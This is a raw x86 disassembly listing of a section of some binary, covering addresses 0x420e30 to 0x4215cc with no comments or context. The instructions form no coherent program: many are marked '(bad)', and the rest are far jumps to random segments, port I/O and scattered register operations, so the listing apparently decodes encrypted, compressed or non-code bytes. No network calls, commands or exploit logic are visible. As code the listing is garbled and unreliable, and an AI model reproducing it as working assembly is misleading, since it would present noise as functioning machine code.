  420e30:	jno    0x420e5e
  420e32:	mov    edi,0x6a9d5609
  420e37:	outs   dx,BYTE PTR ds:[esi]
  420e38:	iret   
  420e39:	das    
  420e3a:	push   edi
  420e3b:	jbe    0x420e7e
  420e3d:	push   ss
  420e3e:	scas   eax,DWORD PTR es:[edi]
  420e3f:	mov    edx,0xebf0f087
  420e44:	bound  esi,QWORD PTR [ebx-0x49221fd0]
  420e4a:	inc    esp
  420e4b:	and    DWORD PTR [ecx],0x79
  420e4e:	xchg   BYTE PTR [eax],bl
  420e50:	push   ecx
  420e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e52:	das    
  420e53:	sub    eax,esp
  420e55:	jle    0x420e25
  420e57:	fst    DWORD PTR [ebx+eax*2-0x23]
  420e5b:	sub    ecx,DWORD PTR [ecx+0x80d3221]
  420e61:	mov    ah,0xe6
  420e63:	int3   
  420e64:	out    0xd2,eax
  420e66:	pop    eax
  420e67:	fwait
  420e68:	dec    ecx
  420e69:	mov    ch,0x2f
  420e6b:	sub    eax,0x19239c38
  420e70:	(bad)  
  420e71:	stos   DWORD PTR es:[edi],eax
  420e72:	adc    eax,0xd6879a10
  420e77:	stc    
  420e78:	(bad)  
  420e79:	sub    BYTE PTR [ebx+0x46],ah
  420e7c:	test   DWORD PTR [edx+0x639cc149],ebp
  420e82:	icebp  
  420e83:	ins    BYTE PTR es:[edi],dx
  420e84:	adc    cl,ch
  420e86:	jmp    0x15fb:0x648a0ea9
  420e8d:	add    esp,DWORD PTR [eax+0x2c]
  420e90:	jecxz  0x420e4d
  420e92:	push   0x95ec439c
  420e97:	(bad)  
  420e98:	jae    0x420ef3
  420e9a:	xlat   BYTE PTR ds:[ebx]
  420e9b:	int    0xf1
  420e9d:	daa    
  420e9e:	btc    DWORD PTR [eax+0x2f],0x3f
  420ea3:	iret   
  420ea4:	pop    ss
  420ea5:	and    BYTE PTR [ecx+0x7ac7e2db],dh
  420eab:	xor    dh,BYTE PTR [ebp+0x27d1b88]
  420eb1:	adc    edx,DWORD PTR [ebp-0x30]
  420eb4:	mov    edi,ebx
  420eb6:	enter  0x50d5,0xe5
  420eba:	cmp    BYTE PTR [ebx+ecx*4-0x3c],bh
  420ebe:	jbe    0x420e4f
  420ec0:	or     eax,0x2cf0691c
  420ec5:	sar    BYTE PTR [ebx],1
  420ec7:	les    esp,FWORD PTR [eax+0x6bd060ec]
  420ecd:	repnz dec ebp
  420ecf:	outs   dx,DWORD PTR ds:[esi]
  420ed0:	sub    eax,0x66ddeb21
  420ed5:	fs fmulp st(3),st
  420ed8:	cld    
  420ed9:	mov    al,ds:0xc3ec0852
  420ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420edf:	daa    
  420ee0:	inc    edi
  420ee1:	jge    0x420ef7
  420ee3:	sbb    al,0xfb
  420ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee6:	ret    
  420ee7:	fwait
  420ee8:	push   ebx
  420ee9:	xchg   BYTE PTR [esi-0xe94f9e0],bh
  420eef:	jmp    0xa937:0xc095eb0c
  420ef6:	xor    al,0x25
  420ef8:	mov    ecx,0x86c7c60e
  420efd:	lahf   
  420efe:	xor    edi,ebp
  420f00:	push   ebp
  420f01:	sub    ecx,esi
  420f03:	inc    esi
  420f04:	push   esi
  420f05:	dec    ecx
  420f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f07:	sub    DWORD PTR [edi],esi
  420f09:	sub    BYTE PTR [ecx],0xce
  420f0c:	mov    ds:0xc40d47c8,al
  420f11:	push   edx
  420f12:	jno    0x420f29
  420f14:	int3   
  420f15:	sub    eax,0xd0654f4d
  420f1a:	mov    esi,0x9d767aed
  420f1f:	data16 sbb BYTE PTR [ecx-0x65],bh
  420f23:	mov    dh,0x2f
  420f25:	sbb    eax,DWORD PTR [eax]
  420f27:	test   BYTE PTR [ebp-0x171d6ff6],ch
  420f2d:	or     edx,esi
  420f2f:	push   eax
  420f30:	push   es
  420f31:	lds    eax,FWORD PTR [edi+0x63]
  420f34:	mov    edx,0x5cc63b17
  420f39:	push   ebx
  420f3a:	call   0xbf8:0x9761961c
  420f41:	xor    esp,DWORD PTR [ebx-0x6dd1ac59]
  420f47:	imul   ebp,DWORD PTR [edx+0x4c],0xffffffcb
  420f4b:	mov    eax,ds:0xca10e20e
  420f50:	sar    BYTE PTR ds:0x2044b000,cl
  420f56:	hlt    
  420f57:	jge    0x420f43
  420f59:	fsubr  DWORD PTR [eax]
  420f5b:	xchg   ebp,eax
  420f5c:	std    
  420f5d:	jge    0x420f07
  420f5f:	add    DWORD PTR [eax+edx*8-0x1cc1a070],esp
  420f66:	sbb    DWORD PTR [ecx-0x1f],ecx
  420f69:	and    DWORD PTR [edx+ebp*4+0x37f4aa37],esp
  420f70:	push   eax
  420f71:	xor    ecx,0xf2f82d38
  420f77:	pop    edi
  420f78:	out    0x2d,eax
  420f7a:	ins    DWORD PTR es:[edi],dx
  420f7b:	adc    BYTE PTR [ecx],al
  420f7d:	dec    eax
  420f7e:	in     eax,dx
  420f7f:	pop    esp
  420f80:	imul   eax,DWORD PTR [ebx+0x33],0x40
  420f84:	repnz or bl,BYTE PTR [eax-0x394b2766]
  420f8b:	ja     0x421002
  420f8d:	ja     0x420f80
  420f8f:	fisttp WORD PTR [edi]
  420f91:	dec    ebx
  420f92:	dec    eax
  420f93:	inc    ebp
  420f94:	sbb    al,0x4b
  420f96:	pop    ds
  420f97:	std    
  420f98:	ret    
  420f99:	or     dl,BYTE PTR [esi+0x6522acb0]
  420f9f:	shl    BYTE PTR [ecx-0x73],0xa4
  420fa3:	add    ecx,edi
  420fa5:	fisubr WORD PTR [esi+0x79]
  420fa8:	loope  0x420f6e
  420faa:	dec    eax
  420fab:	mov    eax,ds:0x5bea1220
  420fb0:	mov    ebx,0xdb132bfb
  420fb5:	mov    dx,WORD PTR [edi-0x18]
  420fb9:	sbb    eax,0xd240e9f5
  420fbe:	das    
  420fbf:	dec    esi
  420fc0:	pop    esp
  420fc1:	mov    bl,cl
  420fc3:	test   al,0xd0
  420fc5:	pop    es
  420fc6:	xchg   DWORD PTR [esi+0x20cc39c3],esp
  420fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fcd:	jle    0x420fac
  420fcf:	call   0x29d1:0x70c71ea
  420fd6:	cmp    dl,0xc5
  420fd9:	mov    edx,0x2eb2b8e6
  420fde:	jmp    0xa9fcadf9
  420fe3:	aam    0x6d
  420fe5:	(bad)  
  420fe6:	imul   BYTE PTR [ebp+0x17dc71c8]
  420fec:	jne    0x421068
  420fee:	lods   al,BYTE PTR ds:[esi]
  420fef:	aad    0xa9
  420ff1:	data16 clc 
  420ff3:	loopne 0x420fcc
  420ff5:	repz mov cl,0x3d
  420ff8:	ret    0xe83c
  420ffb:	or     dh,BYTE PTR [eax+0x6c8a3cb1]
  421001:	das    
  421002:	sub    BYTE PTR [edi-0x59],ch
  421005:	add    bl,BYTE PTR [ecx+0x24]
  421008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421009:	lods   eax,DWORD PTR ds:[esi]
  42100a:	jle    0x420fd6
  42100c:	push   ebx
  42100d:	sar    BYTE PTR ds:0x7ed623f4,0x7d
  421014:	mov    DWORD PTR [ebx-0x6f],edx
  421017:	test   al,0x35
  421019:	fs add al,0xf3
  42101d:	sub    esi,DWORD PTR [ecx-0xe3dbbb1]
  421023:	nop
  421024:	pop    eax
  421025:	inc    esi
  421026:	cwde   
  421027:	mov    ds:0xaf32d011,eax
  42102c:	sub    al,0xb
  42102e:	setbe  BYTE PTR [edx+0x70]
  421032:	cdq    
  421033:	and    eax,0x359e9fcd
  421038:	mov    ds:0x39dd4f68,al
  42103d:	cmp    dh,BYTE PTR [ebx-0x87fbae8]
  421043:	cmp    BYTE PTR [esi+0x47],0xb
  421047:	ret    0xd48e
  42104a:	fld    TBYTE PTR [ecx+0x55]
  42104d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42104f:	jno    0x420fd5
  421051:	add    eax,0x3e84ab4b
  421056:	lea    edi,[ecx]
  421058:	xchg   edx,eax
  421059:	inc    edx
  42105a:	push   ebx
  42105b:	pop    ss
  42105c:	cmp    DWORD PTR [edx-0x8],edx
  42105f:	jo     0x42105c
  421061:	lock push ds
  421063:	push   esi
  421064:	xchg   edx,eax
  421065:	mov    ch,0x1f
  421067:	dec    esi
  421068:	outs   dx,BYTE PTR ds:[esi]
  421069:	test   al,0xf
  42106b:	imul   esp,eax,0xfffffffc
  42106e:	fwait
  42106f:	rcr    DWORD PTR [esi+0x0],cl
  421072:	and    BYTE PTR [edx-0x4b],0xa6
  421076:	daa    
  421077:	dec    ecx
  421078:	data16 jnp 0x421007
  42107b:	scas   eax,DWORD PTR es:[edi]
  42107c:	enter  0x6d3b,0x2f
  421080:	lods   eax,DWORD PTR ds:[esi]
  421081:	xor    BYTE PTR [ebp+ebx*2-0x20],cl
  421085:	outs   dx,BYTE PTR ds:[esi]
  421086:	or     BYTE PTR [ecx-0x7f02ee9f],bh
  42108c:	sahf   
  42108d:	inc    edx
  42108e:	xchg   ebp,eax
  42108f:	retf   
  421090:	ins    BYTE PTR es:[edi],dx
  421091:	call   0x45e5:0x489a32c9
  421098:	push   0x1d532d8f
  42109d:	add    cl,BYTE PTR [eax-0x20]
  4210a0:	add    al,0xfe
  4210a2:	add    edx,DWORD PTR [ebp-0x33e6380]
  4210a8:	scas   eax,DWORD PTR es:[edi]
  4210a9:	mov    al,0xcd
  4210ab:	mov    bl,0xdb
  4210ad:	stc    
  4210ae:	mov    al,ds:0xa435f4a2
  4210b3:	sahf   
  4210b4:	jl     0x42105d
  4210b6:	add    ah,bl
  4210b8:	shl    DWORD PTR [esi+0x84add4],0xa5
  4210bf:	inc    edx
  4210c0:	out    0xae,eax
  4210c2:	pop    edi
  4210c3:	(bad)  
  4210c4:	cmc    
  4210c5:	ds pop ebp
  4210c7:	jge    0x4210a6
  4210c9:	jmp    0x9f96d131
  4210ce:	(bad)  
  4210cf:	ror    BYTE PTR [eax-0x49f52ca1],cl
  4210d5:	add    al,0x83
  4210d7:	(bad)  
  4210d8:	stos   DWORD PTR es:[edi],eax
  4210d9:	jle    0x42110c
  4210db:	push   cs
  4210dc:	test   BYTE PTR [edx-0x37132619],cl
  4210e2:	lock mov eax,0x11e01680
  4210e8:	xchg   ecx,eax
  4210e9:	adc    al,0x92
  4210eb:	in     al,0x3d
  4210ed:	jb     0x421159
  4210ef:	bound  ecx,QWORD PTR [edi+0x5c]
  4210f2:	lods   eax,DWORD PTR ds:[esi]
  4210f3:	pop    ss
  4210f4:	adc    al,0x61
  4210f6:	out    0x9f,al
  4210f8:	mov    ah,0x21
  4210fa:	test   DWORD PTR [esi],ecx
  4210fc:	mov    ds:0xc3a8884f,al
  421101:	out    0x4d,eax
  421103:	and    BYTE PTR [edi+0x5d],0x8b
  421107:	mov    bh,0xd1
  421109:	cld    
  42110a:	push   ss
  42110b:	imul   edi,DWORD PTR [edx+0x35],0x5cc14693
  421112:	adc    dh,BYTE PTR [ecx-0x28]
  421115:	mov    al,ds:0x88b89283
  42111a:	xchg   esp,eax
  42111b:	xor    BYTE PTR [ebp+0x2036b5cd],al
  421121:	pop    esp
  421122:	(bad)  
  421123:	jmp    0x4210e5
  421125:	or     al,0x85
  421127:	sbb    bl,cl
  421129:	bound  esp,QWORD PTR [eax]
  42112b:	push   esp
  42112c:	and    eax,DWORD PTR [edi-0x69]
  42112f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421130:	jns    0x421186
  421132:	in     eax,dx
  421133:	daa    
  421134:	dec    esp
  421135:	shl    BYTE PTR [ebx],0x1e
  421138:	dec    ebx
  421139:	aas    
  42113a:	mov    esi,0x8e68be82
  42113f:	or     eax,0xed6fcda2
  421144:	cmp    edi,esi
  421146:	jmp    0x4211bf
  421148:	xchg   esi,eax
  421149:	dec    ecx
  42114a:	mov    WORD PTR [ebx-0x3c],es
  42114d:	das    
  42114e:	or     DWORD PTR [eax],edx
  421150:	cmp    ah,BYTE PTR [edi-0x61]
  421153:	pop    esp
  421154:	cmp    al,0x29
  421156:	(bad)  
  421157:	push   esp
  421158:	or     eax,0xf9bf2f84
  42115d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42115e:	mov    ds:0x8f45a079,al
  421163:	pop    edi
  421164:	sbb    eax,0xef01fe88
  421169:	in     al,0xd0
  42116b:	sbb    al,0xd8
  42116d:	or     BYTE PTR [esi+0x4cb55266],ch
  421173:	sub    ebx,DWORD PTR [esi-0x6]
  421176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421177:	jmp    0x7ce30b0b
  42117c:	sbb    cl,BYTE PTR [esi+ebp*8-0x10]
  421180:	sbb    al,BYTE PTR [esi-0x23]
  421183:	mov    dl,0xb1
  421185:	addr16 mov ah,0xe1
  421188:	int3   
  421189:	std    
  42118a:	cs dec ecx
  42118c:	dec    ebp
  42118d:	cdq    
  42118e:	sub    DWORD PTR [ebp+0x51],esp
  421191:	xchg   edi,eax
  421192:	bound  esi,QWORD PTR [esi+ebp*4+0xd5dc206]
  421199:	in     eax,dx
  42119a:	imul   BYTE PTR [ecx-0x9ad5565]
  4211a0:	ds in  eax,0xb8
  4211a3:	or     edx,DWORD PTR [eax-0x20]
  4211a6:	mov    eax,ds:0x220c831e
  4211ab:	jno    0x421181
  4211ad:	dec    esp
  4211ae:	ds retf 0xf568
  4211b2:	xchg   edx,eax
  4211b3:	mov    al,ds:0x8251dafa
  4211b8:	push   es
  4211b9:	retf   
  4211ba:	repz dec esp
  4211bc:	add    ecx,DWORD PTR [edx]
  4211be:	ds daa 
  4211c0:	outs   dx,BYTE PTR ds:[esi]
  4211c1:	dec    ebp
  4211c2:	ins    BYTE PTR es:[edi],dx
  4211c3:	adc    BYTE PTR [esi+edi*4+0x5d],dl
  4211c7:	adc    al,0x5b
  4211c9:	nop
  4211ca:	std    
  4211cb:	nop
  4211cc:	or     ebx,DWORD PTR [ebx-0x5d53f794]
  4211d2:	push   ecx
  4211d3:	inc    edx
  4211d4:	pop    ecx
  4211d5:	je     0x421165
  4211d7:	xchg   ebp,eax
  4211d8:	push   cs
  4211d9:	out    dx,eax
  4211da:	jno    0x42124b
  4211dc:	and    eax,0x19f02a13
  4211e1:	fcmovnbe st,st(2)
  4211e3:	mov    ecx,DWORD PTR [edx]
  4211e5:	in     eax,0xd7
  4211e7:	cmp    al,0x29
  4211e9:	lahf   
  4211ea:	ds pop ebp
  4211ec:	les    edi,FWORD PTR [edx-0x1b8202c9]
  4211f2:	xor    dh,BYTE PTR [esi]
  4211f4:	popa   
  4211f5:	pop    es
  4211f6:	mov    eax,0x58fcc4e4
  4211fb:	jg     0x42120b
  4211fd:	jns    0x4211ed
  4211ff:	stc    
  421200:	mov    WORD PTR [ebx-0x2f],ds
  421203:	mov    ds:0xadc6e3f7,al
  421208:	mov    cl,BYTE PTR [edx-0x63]
  42120b:	mov    ds,WORD PTR [eax*8-0x33224c99]
  421212:	add    BYTE PTR [ebp-0x128715c],bl
  421218:	pop    esp
  421219:	cmc    
  42121a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42121b:	retf   0xa722
  42121e:	sar    DWORD PTR [esi+0x3c583b29],cl
  421224:	sub    bh,BYTE PTR [edi]
  421226:	adc    ah,dl
  421228:	jne    0x421266
  42122a:	mov    edx,ss
  42122c:	rol    BYTE PTR [edi+esi*4+0x73],1
  421230:	dec    esi
  421231:	loop   0x4211f1
  421233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421234:	sbb    esi,DWORD PTR [edx-0x78a5bbd4]
  42123a:	imul   ebx,DWORD PTR [esi+0x44d99996],0xb48cdf3f
  421244:	adc    ecx,DWORD PTR [eax-0x7d]
  421247:	sar    ah,0x4c
  42124a:	lea    edx,[ebp-0x35]
  42124d:	sub    ah,BYTE PTR [eax]
  42124f:	jne    0x4212c7
  421251:	imul   esi
  421253:	sub    dh,BYTE PTR [ecx-0x4ff91a0b]
  421259:	shr    DWORD PTR [edi],cl
  42125b:	and    edi,DWORD PTR [ebp+0xd276f]
  421261:	and    bh,BYTE PTR [edx]
  421263:	mov    al,ds:0xb96d2090
  421268:	jb     0x4212db
  42126a:	pushf  
  42126b:	stos   DWORD PTR es:[edi],eax
  42126c:	out    dx,al
  42126d:	jmp    0xcd8e:0x71244129
  421274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421275:	leave  
  421276:	imul   ebp,DWORD PTR [ecx+0x1ea3cece],0xffffffab
  42127d:	jo     0x4212e0
  42127f:	rcl    ch,0xc0
  421282:	push   esp
  421283:	pop    esi
  421284:	sbb    al,0x83
  421286:	scas   eax,DWORD PTR es:[edi]
  421287:	dec    esp
  421288:	repz push ebx
  42128a:	mov    al,ds:0x560e60df
  42128f:	lods   al,BYTE PTR ds:[esi]
  421290:	adc    BYTE PTR [edx-0x7c],0x4f
  421294:	dec    ecx
  421295:	xchg   dh,cl
  421297:	popf   
  421298:	in     eax,dx
  421299:	add    DWORD PTR [esi-0x43853c06],esi
  42129f:	repnz cli 
  4212a1:	jle    0x421322
  4212a3:	jge    0x421281
  4212a5:	loope  0x4212c0
  4212a7:	imul   ebp,edx,0xdd5e551
  4212ad:	stos   DWORD PTR es:[edi],eax
  4212ae:	xchg   edi,eax
  4212af:	push   0xffffffbc
  4212b1:	xchg   esi,eax
  4212b2:	pop    edx
  4212b3:	and    DWORD PTR [edx+ebx*2],ecx
  4212b6:	push   0x3554487
  4212bb:	mov    BYTE PTR [edi+0x73],dh
  4212be:	mov    ah,0xa3
  4212c0:	pop    edx
  4212c1:	pop    esp
  4212c2:	or     eax,0x31e12d2b
  4212c7:	scas   eax,DWORD PTR es:[edi]
  4212c8:	fwait
  4212c9:	mov    ds:0x1ae2e378,al
  4212ce:	jbe    0x42127f
  4212d0:	ret    0xe9e8
  4212d3:	in     al,dx
  4212d4:	je     0x4212f6
  4212d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212d7:	mov    esi,0x3aeb814e
  4212dc:	push   0x76ef059e
  4212e1:	add    ah,BYTE PTR [eax]
  4212e3:	in     eax,dx
  4212e4:	ds jle 0x4212ae
  4212e7:	outs   dx,DWORD PTR ds:[esi]
  4212e8:	fsub   QWORD PTR [eax+0x1ea4fa0c]
  4212ee:	or     dl,BYTE PTR ds:0xcb0007bb
  4212f4:	(bad)  
  4212f5:	popf   
  4212f6:	call   0xeb9f:0x12d9aa7b
  4212fd:	push   eax
  4212fe:	or     BYTE PTR [edi],bh
  421300:	mov    dh,0x90
  421302:	jecxz  0x4212ee
  421304:	cmc    
  421305:	jmp    0x421292
  421307:	mov    ch,0x68
  421309:	inc    ebx
  42130a:	in     eax,0xbd
  42130c:	stos   BYTE PTR es:[edi],al
  42130d:	mov    bh,ch
  42130f:	in     eax,dx
  421310:	add    ebp,DWORD PTR [ebp+0x501df6a5]
  421316:	mov    al,0x35
  421318:	pop    esp
  421319:	add    edx,DWORD PTR [edi+0x48]
  42131c:	push   eax
  42131d:	xchg   esi,eax
  42131e:	sbb    BYTE PTR [edx],cl
  421320:	fs jg  0x4212ef
  421323:	sbb    eax,0x9ac7baa2
  421328:	sub    ecx,edi
  42132a:	out    0x6c,al
  42132c:	mov    ds:0x90d21153,al
  421331:	popa   
  421332:	ficom  DWORD PTR [ecx-0xe646f57]
  421338:	dec    edx
  421339:	int3   
  42133a:	sub    al,BYTE PTR [eax+0x167a520a]
  421340:	imul   ebp,ebx,0xffffff8a
  421343:	adc    eax,0x199637c0
  421348:	imul   esp,DWORD PTR [ebx+0x24c8cf48],0x10
  42134f:	and    BYTE PTR [ebp+0x32],dh
  421352:	xchg   edi,eax
  421353:	cmp    BYTE PTR [ebx+0x73],dh
  421356:	cmp    eax,0xf0767940
  42135b:	pusha  
  42135c:	jmp    0x9bce2d0c
  421361:	cdq    
  421362:	rcr    BYTE PTR [esi+0x585ab68b],0x32
  421369:	cdq    
  42136a:	jae    0x42135e
  42136c:	jl     0x42137b
  42136e:	lds    esp,FWORD PTR [eax]
  421370:	add    BYTE PTR ds:0xcccefa37,cl
  421376:	pop    ecx
  421377:	aad    0x87
  421379:	clc    
  42137a:	in     eax,dx
  42137b:	loopne 0x42133f
  42137d:	mov    eax,0x4a446876
  421382:	pushf  
  421383:	jae    0x42130d
  421385:	jnp    0x4213ff
  421387:	aas    
  421388:	out    dx,eax
  421389:	div    DWORD PTR [eax+0x20b28124]
  42138f:	lahf   
  421390:	ss sbb esi,eax
  421393:	pop    edi
  421394:	imul   ebx,DWORD PTR [edx-0x7a],0x2f
  421398:	jecxz  0x4213ba
  42139a:	nop
  42139b:	xchg   edx,eax
  42139c:	ror    DWORD PTR [ecx],1
  42139e:	mov    eax,0x1cd38b80
  4213a3:	popa   
  4213a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a5:	adc    ebx,eax
  4213a7:	mov    edx,0x35ac1d90
  4213ac:	rol    BYTE PTR [esi-0x67a00caf],cl
  4213b2:	into   
  4213b3:	shl    DWORD PTR [ebp+0x622a2e18],cl
  4213b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213ba:	inc    ebx
  4213bb:	lds    esi,FWORD PTR [edi+0x381fbc41]
  4213c1:	push   edx
  4213c2:	jo     0x421365
  4213c4:	arpl   WORD PTR [edi-0x31],si
  4213c7:	addr16 aas 
  4213c9:	jp     0x4213db
  4213cb:	and    al,0xfe
  4213cd:	dec    eax
  4213ce:	push   0x518bceb2
  4213d3:	mov    edx,0x85d0a70b
  4213d8:	or     BYTE PTR [ebx-0x613b5e95],bl
  4213de:	xchg   ebx,eax
  4213df:	xchg   ebp,eax
  4213e0:	xchg   ebx,eax
  4213e1:	dec    edx
  4213e2:	lfs    edx,FWORD PTR [edi]
  4213e5:	cli    
  4213e6:	enter  0x9f1,0xbd
  4213ea:	imul   edx,DWORD PTR [esi+esi*4-0x251912f7],0xffffffb1
  4213f2:	das    
  4213f3:	icebp  
  4213f4:	mov    esp,0xffd5be65
  4213f9:	loope  0x42140b
  4213fb:	cmp    DWORD PTR [edx+0x736146b2],edx
  421401:	sbb    BYTE PTR [ecx-0x63d9076d],bh
  421407:	repz cli 
  421409:	sub    eax,DWORD PTR [ebx-0x61]
  42140c:	dec    ebp
  42140d:	push   ss
  42140e:	lods   eax,DWORD PTR ds:[esi]
  42140f:	rcr    BYTE PTR [eax+0x73],1
  421412:	in     al,0x5
  421414:	iret   
  421415:	nop
  421416:	xchg   esi,eax
  421417:	jp     0x421444
  421419:	lock ins BYTE PTR es:[edi],dx
  42141b:	(bad)  
  42141c:	stos   DWORD PTR es:[edi],eax
  42141d:	push   eax
  42141e:	ins    BYTE PTR es:[edi],dx
  42141f:	stc    
  421420:	stos   BYTE PTR es:[edi],al
  421421:	jae    0x4213c6
  421423:	pushf  
  421424:	iret   
  421425:	sbb    al,0x53
  421427:	jl     0x42148d
  421429:	bound  edi,QWORD PTR [esi+0x17]
  42142c:	aam    0x46
  42142e:	mov    eax,0x2bb19379
  421433:	call   0xfd1e:0x332015fd
  42143a:	ret    0x80b2
  42143d:	add    al,0x7a
  42143f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421440:	dec    edi
  421441:	mov    DWORD PTR [esi],esp
  421443:	mov    ah,0x5d
  421445:	xor    al,0x87
  421447:	add    dh,BYTE PTR [ecx]
  421449:	xchg   esi,eax
  42144a:	mov    esp,DWORD PTR [ebx+0x2f]
  42144d:	mov    bh,0xb5
  42144f:	pop    edi
  421450:	sub    BYTE PTR [eax+0x63fb3ccf],bh
  421456:	je     0x4213ed
  421458:	sbb    DWORD PTR [eax],ecx
  42145a:	jbe    0x42140a
  42145c:	push   cs
  42145d:	pop    ss
  42145e:	and    BYTE PTR [eax-0x6d],0x5a
  421462:	fwait
  421463:	xchg   ecx,eax
  421464:	popf   
  421465:	mov    ch,0x65
  421467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421468:	js     0x4214a2
  42146a:	and    BYTE PTR [eax+0x22],al
  42146d:	xor    cl,BYTE PTR [eax+0x1e]
  421470:	mov    ch,0x46
  421472:	outs   dx,DWORD PTR ds:[esi]
  421473:	mov    ebx,0xc8aeb84
  421478:	call   0xef0fb6ed
  42147d:	sub    esi,DWORD PTR cs:[eax+0x4a]
  421481:	inc    ebp
  421482:	fnstsw WORD PTR [edi]
  421484:	xchg   edi,eax
  421485:	sub    al,0x12
  421487:	ret    
  421488:	mov    esi,0x5f7d20fc
  42148d:	cmp    DWORD PTR [ecx],ecx
  42148f:	push   ax
  421491:	aaa    
  421492:	ds or  esi,ebx
  421495:	jns    0x42142e
  421497:	jo     0x4214cf
  421499:	repz repnz pop es
  42149c:	stos   DWORD PTR es:[edi],eax
  42149d:	ss es ja 0x421471
  4214a1:	add    eax,0x13788491
  4214a6:	xchg   esp,eax
  4214a7:	ret    
  4214a8:	xchg   edi,eax
  4214a9:	lods   al,BYTE PTR ds:[esi]
  4214aa:	push   ebx
  4214ab:	xor    ebp,esi
  4214ad:	pop    ss
  4214ae:	mov    ch,0x2b
  4214b0:	inc    edi
  4214b1:	and    eax,0x8fbab0fc
  4214b6:	dec    esi
  4214b7:	popa   
  4214b8:	cdq    
  4214b9:	inc    eax
  4214ba:	sub    ebx,DWORD PTR [ecx]
  4214bc:	stos   DWORD PTR es:[edi],eax
  4214bd:	and    esp,DWORD PTR [edx+0x72d926a6]
  4214c3:	xor    ah,BYTE PTR [ecx+0x25]
  4214c6:	outs   dx,BYTE PTR ds:[esi]
  4214c7:	push   ds
  4214c8:	dec    ebp
  4214c9:	inc    eax
  4214ca:	stc    
  4214cb:	cmc    
  4214cc:	cmc    
  4214cd:	jae    0xe3eac97f
  4214d3:	imul   ebp,DWORD PTR ds:0xb8d8c45b,0xffffffa9
  4214da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214db:	or     al,0x58
  4214dd:	fwait
  4214de:	test   DWORD PTR [ebp+esi*4+0x3],edi
  4214e2:	dec    eax
  4214e3:	scas   al,BYTE PTR es:[edi]
  4214e4:	jae    0x4214c5
  4214e6:	ss int 0x3c
  4214e9:	mov    cl,0xef
  4214eb:	cmp    eax,0x30d80611
  4214f0:	ret    
  4214f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214f2:	adc    eax,0x248255a6
  4214f7:	shl    BYTE PTR ds:0xe731f6b1,0xa1
  4214fe:	push   ebp
  4214ff:	sbb    al,BYTE PTR [eax+0x16]
  421502:	les    edx,FWORD PTR [ebx-0x4679c097]
  421508:	repnz adc ebx,eax
  42150b:	out    dx,eax
  42150c:	popa   
  42150d:	out    0xe,al
  42150f:	push   ds
  421510:	push   esp
  421511:	out    dx,eax
  421512:	mov    esp,0x4db13dd6
  421517:	mov    edx,esi
  421519:	ins    DWORD PTR es:[edi],dx
  42151a:	in     eax,dx
  42151b:	test   eax,0x6b433430
  421520:	push   esp
  421521:	mov    eax,ds:0x78889d6b
  421526:	scas   al,BYTE PTR es:[edi]
  421527:	mov    ecx,0xac2ed4c3
  42152c:	xchg   ebx,eax
  42152d:	mov    edi,ecx
  42152f:	jge    0x4214d4
  421531:	shr    DWORD PTR es:[eax-0x4b],1
  421535:	fsub   DWORD PTR [ebp+0x18]
  421538:	pushf  
  421539:	ds adc BYTE PTR es:[ecx],cl
  42153d:	xor    al,0xcb
  42153f:	icebp  
  421540:	dec    edx
  421541:	ret    0xce48
  421544:	pop    eax
  421545:	sahf   
  421546:	popf   
  421547:	push   ss
  421548:	lods   al,BYTE PTR ds:[esi]
  421549:	mov    bl,BYTE PTR [edi+0x61]
  42154c:	push   ebp
  42154d:	loop   0x42150c
  42154f:	sub    eax,DWORD PTR [eax+edi*2-0x7a]
  421553:	push   es
  421554:	(bad)  
  421555:	repnz mov bh,0xc
  421558:	mov    ch,0x11
  42155a:	(bad)  
  42155b:	push   ss
  42155c:	adc    bh,BYTE PTR [ebx]
  42155e:	inc    ecx
  42155f:	mov    esp,0x2fce14d7
  421564:	jmp    0x32f4:0x851911d
  42156b:	in     eax,dx
  42156c:	mov    esp,0x125e712f
  421571:	sbb    bh,BYTE PTR [edi+ebx*4+0x69c20c12]
  421578:	or     DWORD PTR [edx+0x5b],esp
  42157b:	test   BYTE PTR [esi],dh
  42157d:	fistp  QWORD PTR [edx+0x3bd14546]
  421583:	jb     0x4215d5
  421585:	mov    BYTE PTR [edi-0x14],al
  421588:	mov    al,ds:0xc51dcc2e
  42158d:	retf   
  42158e:	xchg   ch,ch
  421590:	push   edx
  421591:	dec    esi
  421592:	sbb    edx,DWORD PTR [ebx-0x2e145607]
  421598:	data16 lahf 
  42159a:	scas   eax,DWORD PTR es:[edi]
  42159b:	mov    dh,0x4e
  42159d:	(bad)
  4215a1:	rcr    BYTE PTR [ecx-0x16],0xfa
  4215a5:	dec    DWORD PTR [eax+0x559a8b23]
  4215ab:	xor    al,BYTE PTR [edi+0x79fdace7]
  4215b1:	inc    esp
  4215b2:	sar    DWORD PTR [ebp+0x1575d008],cl
  4215b8:	or     BYTE PTR [ecx],bl
  4215ba:	pop    ds
  4215bb:	push   esi
  4215bc:	(bad)  
  4215be:	pop    ebx
  4215bf:	push   edi
  4215c0:	dec    eax
  4215c1:	dec    ebp
  4215c2:	aam    0xd6
  4215c4:	pop    ecx
  4215c5:	jne    0x4215f9
  4215c7:	ds jp  0x42163b
  4215ca:	cwde   
  4215cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215cc:	fnop   
